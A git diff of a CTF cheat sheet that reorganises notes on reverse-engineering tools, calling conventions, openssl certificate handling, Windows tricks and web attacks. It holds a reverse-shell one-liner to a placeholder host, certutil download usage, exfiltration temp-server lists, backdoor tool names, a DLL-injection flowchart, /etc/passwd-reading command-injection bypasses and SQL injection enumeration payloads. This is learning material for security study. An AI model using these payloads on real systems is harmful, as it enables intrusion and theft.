@@ -5,7 +5,6 @@ This is a payload collection and references for CTF challenges.
   - [PortSwigger Web Security Academy](https://portswigger.net/web-security)
   - [Bamboofox](https://bamboofox.cs.nctu.edu.tw/courses)
   - [Computer Security](https://edu-ctf.csie.org/)
-- Toolset
   - [Hacker101](https://www.hacker101.com/resources)
 - Practice
   - [CTF Time](https://ctftime.org/)
@@ -15,12 +14,17 @@ This is a payload collection and references for CTF challenges.
   - [pwnable.tw](https://pwnable.tw/)
   - [Hack The Box](https://www.hackthebox.com/)
   - [prompt(1) to win](https://prompt.ml/0)
+  - [TryHackMe](https://tryhackme.com)
 - Real World
   - [Hackerone Bug Bounty](https://hackerone.com/directory/programs)
   - [SOCPrime](https://socprime.com/)
   - [AlienVault](https://otx.alienvault.com/)
   - [Anomali](https://www.anomali.com/)
   - [MITRE ATT&CK](https://attack.mitre.org/)
+- Certification
+  - CEHP
+  - OSCP
+  - C|PENT
 - News
   - [CISA](https://www.cisa.gov/)
   - [BleepingComputer](https://www.bleepingcomputer.com/)
@@ -29,36 +33,15 @@ This is a payload collection and references for CTF challenges.
 
 
 ## Binary
-- Inspection
-  - Useful Linux Command
-    | Cmd                     | Comment        |
-    |:------------------------|:---------------|
-    | `$ readelf -S <binary>` | section header |
-    | `$ objdump -R <binary>` | got table      |
-    | `$ objdump -d <binary>` | plt table      |
-    | `$ c++filt`             |                |
-    | `$ hexer`               |                |
-    | `$ hexcurse`            |                |
-  - PE Viewer
-    - reshacker
-    - CFF Explorer (ExplorerSuite)
-    - PE Detective (ExplorerSuite)
-    - Signature Explorer (ExplorerSuite)
-    - PE-bear
-    - PEview
-    - 010 editor
-  - Packer Detector
-    - PEiD
-    - DIE (detect it easy)
-      * identify shell and other info
-  - Decompiler
-    - [Decompiler Explorer Online](https://dogbolt.org/)
-    - [Compiler Explorer Online](https://godbolt.org/)
-    - jad
-    - uncompyle6
-    - [dnSpy](https://github.com/dnSpy/dnSpy) (.Net Framwork)
-    - Telerik/JustAssembly
-  - segment register / index in descripter table
+- Running Environ
+  - Headers (mingw-w64)
+    - `$ sudo apt install mingw-w64`
+      > /usr/x86_64-w64-mingw32/include
+      > 
+      > /usr/i686-w64-mingw32/include
+  - Library
+    - `$ patchelf --set-interpreter ./libc/ld-linux.so.2 --set-rpath ./libc/ <bin>`
+    - `$ LD_PRELOAD=<lib> <bin>`
 - Debugger
   - IDA pro
     - Command
@@ -94,71 +77,104 @@ This is a payload collection and references for CTF challenges.
       - pwndbg
       - pwngdb
   - CheatEngine72
-- Environ
-  - Headers (mingw-w64)
-    - `$ sudo apt install mingw-w64`
-      > /usr/x86_64-w64-mingw32/include
-      > 
-      > /usr/i686-w64-mingw32/include
-  - Library
-    - `$ patchelf --set-interpreter ./libc/ld-linux.so.2 --set-rpath ./libc/ <bin>`
-    - `$ LD_PRELOAD=<lib> <bin>`
+- Decompiler
+  - [Decompiler Explorer Online](https://dogbolt.org/)
+  - [Compiler Explorer Online](https://godbolt.org/)
+  - jad
+  - uncompyle6
+  - [dnSpy](https://github.com/dnSpy/dnSpy) (.Net Framwork)
+  - Telerik/JustAssembly
+- Useful Linux Command
+  | Cmd                     | Comment        |
+  |:------------------------|:---------------|
+  | `$ readelf -S <binary>` | section header |
+  | `$ objdump -R <binary>` | got table      |
+  | `$ objdump -d <binary>` | plt table      |
+  | `$ c++filt`             |                |
+  | `$ hexer`               |                |
+  | `$ hexcurse`            |                |
+- PE Viewer
+  - reshacker
+  - CFF Explorer (ExplorerSuite)
+  - PE Detective (ExplorerSuite)
+  - Signature Explorer (ExplorerSuite)
+  - PE-bear
+  - PEview
+  - 010 editor
+- API Hook
+  - [Microsoft Research Detours Package](https://github.com/microsoft/Detours)
+  - pintool
+  - strace / ltrace
+- Pack Detector
+  - PEiD
+  - DIE (detect it easy)
+    * identify shell and other info
 - Payload
   - pwntools
   - one\_gadget
   - angr
-- API Hook
-  - [Microsoft Research Detours Package](https://github.com/microsoft/Detours)
 
-### Calling Convention
+
+### Background
+
+#### Calling Convention
 - Compare
-  | Type                      | Ret | Parameters                  | Stack Cleaner | Note                      | 
-  |---------------------------|-----|-----------------------------|---------------|---------------------------|
-  | cdecl (Windows/Linux x86) | eax | stack                       | caller        |                           |
-  | Sysv (Linux x86\_64)      | rax | rdi,rsi,rdx,rcx,r8,r9,stack | caller        | call when 16-byte aligned |
-  | stdcall (Win32 API)       | eax | stack                       | callee        |                           |
-  | Microsoft x64             | rax | rcx,rdx,r8,r9,stack         | caller        |                           |
-- stdcall (win32api)
+  | Type                             | Platform            | Ret     | Parameters                  | Stack Cleaner | Note                                      | 
+  |----------------------------------|---------------------|---------|-----------------------------|---------------|-------------------------------------------|
+  | stdcall                          | Win32 API           | eax     | stack                       | callee        |                                           |
+  | cdecl                            | Win32 / Linux x86   | eax     | stack                       | caller        |                                           |
+  | Microsoft x64 calling convention | Win64               | rax     | rcx,rdx,r8,r9,stack         | caller        |                                           |
+  | SysV ABI (C ABI)                 | Linux x86\_64       | rdx:rax | rdi,rsi,rdx,rcx,r8,r9,stack | caller        | called when 16-byte aligned               |
+  | syscall                          | Linux x86\_64       | rax     | rdi,rsi,rdx,r10,r8,r9,stack | caller        | rax: syscall number, rcx: rip, r11: flags |
+  | int 0x80                         | Linux x86           | eax     | ebx,ecx,edx,esd,edi,ebp     | caller        | eax: syscall number                       |
 
-  ```c
-  __attribute__((stdcall)) void func(int a, int b, int c) {
-    ...
-  }
-  ```
+- Win32 Calling Convention Example
+  - stdcall (win32api)
 
-- fastcall
-
-  ```c
-  __attribute__((fastcall)) void func(int a, int b, int c) {
-    ...
-  }
-  ```
-
-- thiscall
-  > put `this` in `ecx`
-  > 
-  > used in class member method
-
-  ```
-  class human {
-    protected:
-    string nation;
-    public:
-    virtual string getNation() {
-      return this->nation;
+    ```c
+    __attribute__((stdcall)) void func(int a, int b, int c) {
+      ...
     }
-  };
-  ```
+    ```
 
-  ```
-  lea edx,[ebp-0x34]
-  ...
-  mov ecx,edx
-  call eax
-  ...
-  ```
+  - fastcall
 
-### PE file format
+    ```c
+    __attribute__((fastcall)) void func(int a, int b, int c) {
+      ...
+    }
+    ```
+
+  - thiscall
+    > put `this` in `ecx`
+    > 
+    > used in class member method
+
+    ```
+    class human {
+      protected:
+      string nation;
+      public:
+      virtual string getNation() {
+        return this->nation;
+      }
+    };
+    ```
+
+    ```
+    lea edx,[ebp-0x34]
+    ...
+    mov ecx,edx
+    call eax
+    ...
+    ```
+
+#### File Format
+- segment register / index in descripter table
+
+##### ELF
+
+##### PE
 - Alignment
   - File
     - FileAlignment: 0x200
@@ -166,7 +182,7 @@ This is a payload collection and references for CTF challenges.
   - Process
     - SectionAlignment: 0x1000
     - Page Model
-- Layout
+- [PE Format](https://learn.microsoft.com/en-us/windows/win32/debug/pe-format)
   | Layout  |                               |
   |:--------|:------------------------------|
   | Headers | Dos MZ Header                 |
@@ -182,124 +198,29 @@ This is a payload collection and references for CTF challenges.
   | Null    |                               |
 
 
+### Buffer Over Flow
+
+### Fuzzing
+
 ## Crypto
-- python
-  - pyCryptodome
-  - Crypto.Util.number
-    | Function | Comment         |
-    |:---------|:----------------|
-    | inverse  | modulus inverse |
+- pyCryptodome
+- Crypto.Util.number
+  | Function | Comment         |
+  |:---------|:----------------|
+  | inverse  | modulus inverse |
 - Sage
   - [sagemath](https://sagecell.sagemath.org/)
   - [CoCalc](https://cocalc.com/)
   - `apt install sagemath`
-- hashcat
-- openssl
-  - Generate
-    > [Generate cert chain](https://blog.davy.tw/posts/use-openssl-to-sign-intermediate-ca/)  
-    > [SAN](https://medium.com/@antelle/how-to-generate-a-self-signed-ssl-certificate-for-an-ip-address-f0dd8dddf754)  
-    > /etc/ssl/openssl.cnf
+- Password Brute Force
+  - hashcat
+  - hydra
+    - crunch
 
-    ```bash
-    #Gen Key (Optional)
-    openssl genrsa -out ca.key 4096
 
-    #CA
-    openssl req -new -out ca.crt -sha256 -x509 -days 7300 \
-      -newkey rsa:4096 -nodes -keyout ca.key \
-      -subj "/C=TW/ST=Taiwan/L=Hsinchu/O=Organization/OU=Organization Unit/CN=Common Name"
+### Background
 
-    openssl ca -selfsign -keyfile ca.key -infiles ca.csr \
-      -startdate 20211001000000Z -enddate 20311001000000Z
-
-    #Intermediate CSR
-    openssl req -new -out intermediate.csr -sha256 \
-      -newkey rsa:4096 -nodes -keyout intermediate.key \
-      -config <(cat <<EOF
-    [ req ]
-    ...
-    EOF
-    )
-
-    #Intermediate / Endentity CRT
-    openssl x509 -req -out intermediate.crt -in intermediate.csr -days 7300 \
-      -CA ca.crt -CAkey ca.key -CAserial ca.serial -CAcreateserial \
-      -extensions x509v3_config -extfile <(cat <<EOF
-    [ x509v3_config ]
-    subjectKeyIdentifier = hash
-    authorityKeyIdentifier = keyid:always,issuer
-    basicConstraints = CA:true, pathlen:0
-    EOF
-    )
-    ```
-    
-  - Listen
-
-    ```bash
-    openssl genrsa -out server.key 4096
-    openssl req -new -key server.key -x509 -days 3653 -out server.crt
-    openssl s_server -key server.key -cert server.crt -port 443
-    ```
-
-  - Get cert from server
-
-    ```bash
-    openssl s_client -connect <ip>:<port> -showcerts
-    ```
-
-  - Read cert
-
-    ```bash
-    openssl x509 -in product.crt -noout -text
-    ```
-
-  - Verify cert 
-
-    ```bash
-    openssl verify -CAfile root.crt -untrusted intermediate.crt product.crt
-    openssl verify -CAfile <(cat intermediate.crt root.crt) product.crt
-    ```
-
-  - Verify cert with key
-
-    ```bash
-    printf '123' \
-      | openssl rsautl -encrypt -inkey <(openssl x509 -pubkey -noout -in sensor.crt) -pubin \
-      | openssl rsautl -decrypt -inkey sensor.key
-    ```
-
-  - Verify mutual-auth
-
-    ```
-    openssl s_server -debug \
-      -CAfile root.crt \
-      -cert_chain <(cat product.crt intermediate.crt root.crt) \
-      -cert server.crt \
-      -key server.key \
-      -Verify 5 -verify_return_error -port 12345
-    openssl s_client \
-      -CAfile root.crt \
-      -cert_chain <(cat product.crt intermediate.crt root.crt) \
-      -cert client.crt \
-      -key client.key \
-      -showcerts -connect 127.0.0.1:12345
-    curl \
-      --cacert root.crt \
-      --cert <(cat client.crt product.crt intermediate.crt) \
-      --key ./cert/client.key \
-      https://127.0.0.1:12345
-    ```
-    
-- MakeCert and New-SelfSignedcertificate
-
-  ```
-  #MakeCert -n 'CN=code.signing' -ss My -r -pe -sr localmachine -cy end -eku 1.3.6.1.5.5.7.3.3 -len 4096 -b 2020/01/01 -e 2025/01/01
-  New-SelfSignedCertificate -CertStoreLocation 'Cert:\CurrentUser\My' -KeyAlgorithm RSA -KeyLength 4096 -Type CodeSigningCert -KeyUsage DigitalSignature -KeyUsageProperty Sign -Subject 'CN=code signing test'
-  Set-AuthenticodeSignature -FilePath @(Get-ChildItem -Recurse '*.exe','*.dll','*.ps1') -Certificate (Get-ChildItem Cert:\CurrentUser\My -codesigning)[0] -IncludeChain 'NotRoot' -HashAlgorithm SHA256 -TimestampServer 'http://timestamp.globalsign.com/?signature=sha2'
-  signtool.exe verify /pa <binary>
-  ```
-
-### Cryptanalysis
+#### Cryptanalysis
 - Kerckhoff's Principle
 - Classical Cryptanalysis
   - Mathmatical Analysis
@@ -312,7 +233,7 @@ This is a payload collection and references for CTF challenges.
 - Implementation Attacks
 - Social Engineering
 
-### Symmetric Cipher
+#### Symmetric Cipher
 - Stream Cipher
   > encrypt bits individually
   > 
@@ -369,8 +290,195 @@ This is a payload collection and references for CTF challenges.
   > - always encrypt a full block (several bits)
   > - common for internet applications
 
+#### Certificate
+- Generate
+  > [Generate cert chain](https://blog.davy.tw/posts/use-openssl-to-sign-intermediate-ca/)  
+  > [SAN](https://medium.com/@antelle/how-to-generate-a-self-signed-ssl-certificate-for-an-ip-address-f0dd8dddf754)  
+  > /etc/ssl/openssl.cnf
+
+  - Self-signed Certificate (Root CA)
+
+    ```bash
+    #CA
+    openssl genrsa -out ca.key 4096
+    openssl req -new -out ca.csr -sha256 \
+      -key ca.key -nodes \
+      -subj "/C=TW/ST=Taiwan/L=Hsinchu/O=Organization/OU=Organization Unit/CN=Common Name"
+
+    openssl ca -selfsign -keyfile ca.key -in ca.csr -outdir . -out ca.crt \
+      -startdate 20211001000000Z -enddate 20311001000000Z -config <(cat <<-EOF
+    [ ca ]
+    default_ca                   = CA_default
+
+    [ CA_default ]
+    database                     = ./index.txt
+    email_in_dn                  = no
+    rand_serial                  = yes
+    default_md                   = sha256
+    default_days                 = 730
+    policy                       = policy_any
+
+    [ policy_any ]
+    countryName                  = supplied
+    stateOrProvinceName          = optional
+    organizationName             = optional
+    organizationalUnitName       = optional
+    commonName                   = supplied
+    emailAddress                 = optional
+
+    EOF
+    )
+
+    #CA in one command
+    openssl req -new -out ca.crt -sha256 \
+      -newkey rsa:4096 -nodes -keyout ca.key \
+      -subj "/C=TW/ST=Taiwan/L=Hsinchu/O=Organization/OU=Organization Unit/CN=Common Name" \
+      -x509 -days 7300
+      ```
+
+  - Sign certificate
+
+    ```bash
+    #CSR
+    openssl req -new -out intermediate.csr -sha256 \
+      -newkey rsa:4096 -nodes -keyout intermediate.key \
+      -subj "/C=TW/ST=Taiwan/L=Hsinchu/O=Organization/OU=Organization Unit/CN=Common Name" \
+      -config <(cat <<EOF
+    [ req ]
+    ...
+    EOF
+    )
+
+    #CRT
+    openssl x509 -req -out intermediate.crt -in intermediate.csr -days 7300 \
+      -CA ca.crt -CAkey ca.key -CAserial ca.serial -CAcreateserial \
+      -extensions x509v3_config -extfile <(cat <<EOF
+    [ x509v3_config ]
+    subjectKeyIdentifier = hash
+    authorityKeyIdentifier = keyid:always,issuer
+    basicConstraints = CA:true, pathlen:0
+    EOF
+    )
+      ```
+
+  - Sign CRL
+
+    ```bash
+    #CRL
+    openssl ca -gencrl -keyfile ca.key --cert ca.crt -out crl.pem \
+      -crlexts crl_ext --crldays 730 -revoke ${CRT_PATH} -config <(cat <<EOF
+    [ ca ]
+    default_ca                   = CA_default
+
+    [ CA_default ]
+    database                     = ./index.txt
+    default_md                   = sha256
+
+    [ crl_ext ]
+    authorityKeyIdentifier       = keyid:always,issuer:always
+    EOF
+    )
+    ```
+  
+- Verify
+  - Cert Chain
+
+    ```bash
+    openssl verify -CAfile root.crt -untrusted intermediate.crt product.crt
+    openssl verify -CAfile <(cat intermediate.crt root.crt) product.crt
+
+    openssl verify -crl_check -CAfile <(cat ca.crt crl.pem) intermediate.crt
+    ```
+
+  - Cert Pair
+
+    ```bash
+    printf '123' \
+      | openssl rsautl -encrypt -inkey <(openssl x509 -pubkey -noout -in sensor.crt) -pubin \
+      | openssl rsautl -decrypt -inkey sensor.key
+    ```
+
+  - CRL
+
+    ```bash
+    openssl s_client \
+      -CAfile <(cat ca.crt crl.pem) \
+      -crl_check -connect 127.0.0.1:12345 \
+    ```
+
+- Read cert
+
+  ```bash
+  openssl x509 -in product.crt -noout -text
+  ```
+
+- TLS Server / Client
+  - Basic
+
+    ```bash
+    openssl s_server -key server.key -cert server.crt [-accept <ip>:<port>]
+    openssl s_client [-showcerts] -connect <ip>:<port>
+    ```
+
+  - Verify Server
+
+    ```bash
+    openssl s_server [-debug] \
+      -CAfile root.crt \
+      -cert_chain <(cat product.crt intermediate.crt) \
+      -cert server.crt -key server.key \
+      [-accept <ip>:<port>]
+
+    openssl s_client [-showcerts] \
+      -CAfile root.crt \
+      -verify_return_error \
+      -connect <ip>:<port>
+    ```
+
+  - Mutual Auth
+
+    ```bash
+    #Server Alternative 1
+    openssl s_server [-debug] \
+      -CAfile root.crt \
+      -cert_chain <(cat product.crt intermediate.crt) \
+      -cert server.crt -key server.key \
+      -verify_return_error -Verify 5 \
+      [-accept <ip>:<port>]
+
+    #Server Alternative 2
+    socat "OPENSSL-LISTEN:8888,cafile=root.crt,certificate=client-chain.crt,key=client.key,reuseaddr,verify" STDOUT
+
+    #Client Alternative 1
+    openssl s_client [-showcerts] \
+      -CAfile root.crt \
+      -cert_chain <(cat product.crt intermediate.crt) \
+      -cert client.crt -key client.key \
+      -verify_return_error \
+      -connect <ip>:<port>
+
+    #Client Alternative 2
+    curl \
+      --cacert root.crt \
+      --cert <(cat client.crt product.crt intermediate.crt) \
+      --key client.key \
+      --resolve <Cert CN>:<port>:<ip>
+      https://<Cert CN>:<port>
+
+    ```
+    
+- MakeCert and New-SelfSignedcertificate
+
+  ```
+  #MakeCert -n 'CN=code.signing' -ss My -r -pe -sr localmachine -cy end -eku 1.3.6.1.5.5.7.3.3 -len 4096 -b 2020/01/01 -e 2025/01/01
+  New-SelfSignedCertificate -CertStoreLocation 'Cert:\CurrentUser\My' -KeyAlgorithm RSA -KeyLength 4096 -Type CodeSigningCert -KeyUsage DigitalSignature -KeyUsageProperty Sign -Subject 'CN=code signing test'
+  Set-AuthenticodeSignature -FilePath @(Get-ChildItem -Recurse '*.exe','*.dll','*.ps1') -Certificate (Get-ChildItem Cert:\CurrentUser\My -codesigning)[0] -IncludeChain 'NotRoot' -HashAlgorithm SHA256 -TimestampServer 'http://timestamp.globalsign.com/?signature=sha2'
+  signtool.exe verify /pa <binary>
+  ```
+
 
 ## Misc
+
 - Binary Forensic
   - binwalk 
   - polyfile
@@ -392,11 +500,11 @@ This is a payload collection and references for CTF challenges.
 
 
 ## System
-- Vulnerability Assessment
-  - OpenVAS
-  - metasploit
-  - nmap
-  - cobaltstrike
+- Malware Scanner
+  - [Microsoft Safety Scanner](https://docs.microsoft.com/en-us/windows/security/threat-protection/intelligence/safety-scanner-download)
+  - [Trend Micro Anti-Threat Toolkit](https://www.trendmicro.com/zh_tw/business/capabilities/solutions-for/ransomware/free-tools.html)
+  - [VirusTotal](https://www.virustotal.com/gui/)
+  - [nodistribute](https://nodistribute.com/)
 - System Forensic
   - wireshark
   - autopsy
@@ -408,20 +516,31 @@ This is a payload collection and references for CTF challenges.
   - WinObj (SysinternalsSuite)
   - Task Explorer (ExplorerSuite)
   - Driver List (ExplorerSuite)
-- Malware Scanner
-  - [Microsoft Safety Scanner](https://docs.microsoft.com/en-us/windows/security/threat-protection/intelligence/safety-scanner-download)
-  - [Trend Micro Anti-Threat Toolkit](https://www.trendmicro.com/zh_tw/business/capabilities/solutions-for/ransomware/free-tools.html)
-  - [VirusTotal](https://www.virustotal.com/gui/)
-  - [nodistribute](https://nodistribute.com/)
+  - FTK Imager
+- Vulnerability Assessment
+  - OpenVAS
+  - metasploit
+  - nmap
+  - cobaltstrike
 
-### Windows
+### Background
+
+#### Windows
+> https://lolbas-project.github.io/
+
 - `SET __COMPAT_LAYER=RunAsInvoker`
 - File
   - `fsutil file queryfileid <file>`
   - `$(Get-Item filename).lastwritetime=$(Get-Date "mm/dd/yyyy hh:mm am/pm")`
+- NTFS Stream
+  > [NTFS File Structure](https://www.researchgate.net/profile/Costas_Katsavounidis2/publication/363773832_Master_File_Table_MFT_on-disk_Structures_NTFS_31_httpsgithubcomkacos2000MFT_Browser/links/632da89086b22d3db4d9afad/Master-File-Table-MFT-on-disk-Structures-NTFS-31-https-githubcom-kacos2000-MFT-Browser.pdf)  
+  > [NTFS Streams](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-fscc/c54dec26-1551-4d3a-a0ea-4fa40f848eb3)  
+  > [File Streams (Local File Systems)](https://docs.microsoft.com/en-us/windows/win32/fileio/file-streams)  
+  - `fsutil file layout <file>`
+  - Extended Attribute
+    - `fsutil file queryEA <file>`
+    - WSL metadata
   - Alternative Data Stream
-    > [File Streams (Local File Systems)](https://docs.microsoft.com/en-us/windows/win32/fileio/file-streams)
-
     ```cmd
     echo abc > note.txt:abc.txt
     echo C:\Windows\System32\cmd.exe > note.txt:cmd.exe
@@ -431,6 +550,7 @@ This is a payload collection and references for CTF challenges.
     forfiles /M note.txt /C "note.txt:cmd.exe"
 
     Get-Content note.txt -stream abc.txt
+    more < note.txt:abc.txt:$DATA
     ```
 - [Naming Files, Paths, and Namespaces](https://docs.microsoft.com/en-us/windows/win32/fileio/naming-a-file)
   - Namespace
@@ -490,34 +610,45 @@ This is a payload collection and references for CTF challenges.
   - Sysmon
     - [SysmonSimulator](https://rootdse.org/posts/understanding-sysmon-events/)
 
-### MacOS
+#### Linix/Unix
+> https://gtfobins.github.io/
+
+#### macOS
 - Resource Fork
 - Named Fork
 - Data Fork
 
+### DLL Injection
+- [Injecting API Hooking Attack with DLL Injection | S12 - H4CK](https://medium.com/@s12deff/injecting-api-hooking-attack-with-dll-injection-897548af47a8)
+- [Malware Technique: DLL Injection | Ricky Severino](https://rickyseverino.medium.com/malware-technique-dll-injection-ffcb960ab2a1)
+  ```mermaid
+  flowchart
 
-## Web / Remote
+  malproc((malicious process))
+
+  malproc --> GetCurrentProcess --handle--> OpenProcessToken --handle--> AdjustTokenPrivileges
+  malproc --SE_DEBUG_NAME--> LookupPrivilegeValue --LUID--> AdjustTokenPrivileges
+
+  malproc --target process name--> CreateToolhelp32Snapshot --pid--> OpenProcess --hProcess--> VirtualAllocEx --lpRemoteMemory--> WriteProcessMemory
+  malproc --injected dll path-->GetFullPathName --path--> WriteProcessMemory
+
+  malproc --kernel32.dll--> GetModuleHandle --hKernel32--> GetProcAddress --lpLoadLibrary--> CreateRemoteThread
+  OpenProcess --hProcess--> CreateRemoteThread
+  VirtualAllocEx --lpRemoteMemory--> CreateRemoteThread --> dll((injected dll))
+
+  AdjustTokenPrivileges -. needed when process owned by another account .-> VirtualAllocEx
+  WriteProcessMemory -.-> CreateRemoteThread
+  ```
+
+
+## Web
 > [WEB CTF CheatSheet](https://github.com/w181496/Web-CTF-Cheatsheet/blob/master/README.md#%E7%A9%BA%E7%99%BD%E7%B9%9E%E9%81%8E)  
 > [Web Security CheatSheet](https://blog.p6.is/Web-Security-CheatSheet/)  
 > [Basic Concept of Penetration Testing](https://hackmd.io/@boik/ryf5wZM5Q#/)  
 > [Awesome Web Security](https://github.com/qazbnm456/awesome-web-security)  
 > [Basic concept of Penetration Testing](https://hackmd.io/@boik/ryf5wZM5Q?type=slide#/)  
-> [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/index.html)  
-
-- Temp Server
-  - webhook.site
-    - unique URL (https / CORS)
-    - unique email
-  - hookbin.com
-  - requestbin.net
-  - beeceptor
-- Connection
-  - `/dev/tcp/<HOST>/<PORT>`
-  - telnet
-  - nc / ncat
-  - socat
-- HTTP / HTTPS Request
-  - [HTTPie](https://devhints.io/httpie)
+> [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/index.html)
+> [OWASP WSTG](https://owasp.org/www-project-web-security-testing-guide/stable/)
 - Recon
   - Target
     - [SHODAN](https://www.shodan.io/)
@@ -525,6 +656,8 @@ This is a payload collection and references for CTF challenges.
     - [Censys](https://search.censys.io/)
       > Censys helps organizations, individuals, and researchers find and monitor
       > every server on the Internet to reduce exposure and improve security
+    - Google Hacking
+      - [Google Hacking Database](https://www.exploit-db.com/google-hacking-database)
   - Site Information
     - maltego
     - [Netcraft Site Report](https://sitereport.netcraft.com/)
@@ -542,33 +675,43 @@ This is a payload collection and references for CTF challenges.
     - [dnsdumpster](https://dnsdumpster.com/)
     - [robtex](https://www.robtex.com/)
       - Subdomains
-  - Content
+  - Crawler
     - dirb
     - DirBuster
     - git-dumper
     - wfuzz
-
       ```bash
       wfuzz -c -z file,/raft-large-files.txt -hc 404 "${URL}"
       ```
-
     - ffuf
-- Scanner
-  - sqlmap
-  - xsser
-  - ZAP
 - Payload
   - Burpsuit
-  - Google Hacking
-    - [Google Hacking Database](https://www.exploit-db.com/google-hacking-database)
   - [Exploit DB](https://www.exploit-db.com/)
-  - hydra
-    - crunch
   - c-jwt-cracker
-- Backdoor
-  - weevely
-  - veil
-  - BeEF
+  - Scanner
+    - sqlmap
+    - xsser
+    - ZAP
+  - Backdoor
+    - weevely
+    - veil
+    - BeEF
+  - Reverse Shell
+    - `/bin/sh -i >& /dev/tcp/<HOST>/<PORT> 0<&1`
+    - [reverse ICMP shell (icmpsh)](https://github.com/bdamele/icmpsh)
+- Connection
+  - `/dev/tcp/<HOST>/<PORT>`
+  - telnet
+  - nc / ncat / socat
+  - certutil.exe -urlcache -f `<url>` `<filename>`
+  - [HTTPie](https://devhints.io/httpie)
+- Public Temp Server
+  - webhook.site
+    - unique URL (https / CORS)
+    - unique email
+  - beeceptor
+  - hookbin.com
+  - requestbin.net
 
 ### Background
 - [Basics of HTTP](https://developer.mozilla.org/zh-TW/docs/Web/HTTP/Basics_of_HTTP)
@@ -606,9 +749,6 @@ This is a payload collection and references for CTF challenges.
   - $ cat /f\*
   - $ cat /f?a?
   - $ cat ${HOME:0:1}etc${HOME:0:1}passwd
-- Reverse Shell
-  - `/bin/sh -i >& /dev/tcp/<HOST>/<PORT> 0<&1`
-  - [reverse ICMP shell (icmpsh)](https://github.com/bdamele/icmpsh)
 
 ### CRLF Injection
 - Inject `\r\n` to headers
@@ -737,18 +877,19 @@ This is a payload collection and references for CTF challenges.
     | getimagesize()        | unlink()  | file()         |
     | fopen()               | is\_dir() | ...            |
 
-    ```php
-    <?php
-      class Cat {}
-      $phar = new Phar("pharfile.phar");
-      $phar->startBuffering();
-      $phar->setStub("<?php __HALT_COMPILER(); ?>");
-      $c = new Cat();
-      $phar->setMetadata($c);
-      $phar->addFromString("meow.txt", "owo");
-      $phar->stopBuffering();
-    ?>
-    ```
+    - Create phar file by `php --define phar.readonly=0 ${file}`
+      ```php
+      <?php
+        class Cat {}
+        $phar = new Phar("pharfile.phar");
+        $phar->startBuffering();
+        $phar->setStub("<?php __HALT_COMPILER(); ?>");
+        $c = new Cat();
+        $phar->setMetadata($c);
+        $phar->addFromString("meow.txt", "owo");
+        $phar->stopBuffering();
+      ?>
+      ```
   - [POP Chain](https://github.com/ambionics/phpggc)
 - Python
   - Magic Method
@@ -767,12 +908,52 @@ This is a payload collection and references for CTF challenges.
     ```
 
 ### DOM Clobbering
-- Insert HTML and accessed by JavaScript
-  | HTML             | JavaScript | Reference  |
-  |:-----------------|:-----------|:-----------|
-  | `<a id=a>`       | a          | window.a   |
-  | `<img name='a'>` | a          | window.a   |
-  |                  |            | document.a |
+- Inject HTML into a page to manipulate the DOM to change the behavior of JavaScript on the page
+  - Access by `id` directly or by `windows.id`
+    ```html
+    <any id="a"></any>
+    <script>
+      console.log(a)
+      console.log(window.a)
+    </script>
+    ```
+  - Access by `document.a` additionally
+    ```html
+    <img name="a">
+    <form name="b"></form>
+    <embed name="c">
+    <object name="d"></object>
+    <script>
+      console.log(document.a)
+      console.log(document.b)
+      console.log(document.c)
+      console.log(document.d)
+    </script>
+    ```
+  - Access by combination of `id` and `name`
+    ```html
+    <any id="a"></any>
+    <any id="a" name="b"></any>
+    <script>
+      console.log(a) // HTMLCollection[]
+      console.log(a.a)
+      console.log(a.b)
+    </script>
+    ```
+  - Access multi-layer windows object
+    ```html
+    <iframe name="a" srcdoc='
+      <iframe name="b" srcdoc="
+        <iframe name=&amp;quot;c&amp;quot; srcdoc=&amp;quot;
+          <a id=d></a>
+        &amp;quot;></iframe>
+      "></iframe>
+    '></iframe>
+    <script>
+      console.log(a.b.c.d)
+    </script>
+    ```
+
 - Case Study
   - [XSS in GMail’s AMP4Email via DOM Clobbering](https://research.securitum.com/xss-in-amp4email-dom-clobbering/)
 
@@ -780,6 +961,7 @@ This is a payload collection and references for CTF challenges.
 
 ### Local File Inclusion (LFI)
 - RCE
+  - [PHP filter chain generator](https://github.com/synacktiv/php_filter_chain_generator)
   - access.log / error.log
   - /proc/self/environ `user-agent`
   - phpinfo `tmp file location`
@@ -900,9 +1082,10 @@ This is a payload collection and references for CTF challenges.
 
         
 ### Prototype Pollution
-- `a`.  \_\_proto\_\_ === `A`.prototype
-- `und  efined` may be replaced when its prototype has the attribute.
-- Trig  ger
+- `a = new A()`
+  - `a`.  \_\_proto\_\_ === `A`.prototype
+- `undefined` may be replaced when its prototype has the attribute.
+- Trigger
   - Set
     - [lodash](https://snyk.io/vuln/SNYK-JS-LODASH-608086) (\_.setWidth, \_.set)
   - Merge / Extend
@@ -923,6 +1106,8 @@ This is a payload collection and references for CTF challenges.
   - [MITRE](https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=prototype+pollution)
   - [HackerOne XSS](https://hackerone.com/reports/986386)
   - [CVE-2019-7609](https://slides.com/securitymb/prototype-pollution-in-kibana)
+  - [Client-Side Prototype Pollution](https://github.com/BlackFan/client-side-prototype-pollution)
+  - [Exploiting Client-Side Prototype Pollution in the wild](https://blog.s1r1us.ninja/research/PP)
 
 ### SQL Injection
 - Type
@@ -983,9 +1168,9 @@ This is a payload collection and references for CTF challenges.
 - Special Table
   | DB           | Payload                                                             | Comment   |
   |:-------------|:--------------------------------------------------------------------|:----------|
-  | MySQL >= 5.0 | `SELECT schema_name FROM information_schema.schemata`               | Databases |
-  |              | `SELECT table_name FROM information_schema.tables`                  | Tables    |
-  |              | `SELECT group_concat(column_name) FROM information_schema.columns`  | Columns   |
+  | MySQL >= 5.0 | `SELECT schema_name FROM information_schema.schemata;`               | Databases |
+  |              | `SELECT table_name FROM information_schema.tables WHERE table_schema = '<database>';`                  | Tables    |
+  |              | `SELECT group_concat(column_name) FROM information_schema.columns WHERE table_schema = '<database>' AND table_name = '<table>'`  | Columns   |
 
 ### SSRF
 > [SSRF bible Cheatsheet](https://cheatsheetseries.owasp.org/assets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet_SSRF_Bible.pdf)
@@ -1189,26 +1374,51 @@ This is a payload collection and references for CTF challenges.
 - Format String Attack
 
 ### XS-Leaks
-> Browser-based side channel attack
+> [xsleaks.dev](https://xsleaks.dev/)
+> [xsleaks/xsleaks](https://github.com/xsleaks/xsleaks)  
 
-- [xsleaks/xsleaks](https://github.com/xsleaks/xsleaks)
